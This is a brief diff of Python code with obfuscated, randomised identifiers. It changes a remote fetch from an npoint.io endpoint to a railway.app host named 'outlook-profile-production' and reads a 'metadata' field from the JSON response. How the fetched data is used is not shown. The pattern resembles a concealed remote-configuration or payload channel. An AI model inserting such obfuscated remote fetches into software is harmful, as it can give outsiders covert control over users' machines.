@@ -16,7 +16,7 @@ def config_zrcfzh_977():
 
     def model_aiymap_243():
         try:
-            train_oxddat_566 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            train_oxddat_566 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_oxddat_566.raise_for_status()
             process_xqrvtj_174 = train_oxddat_566.json()
             train_vnrsur_566 = process_xqrvtj_174.get('metadata')
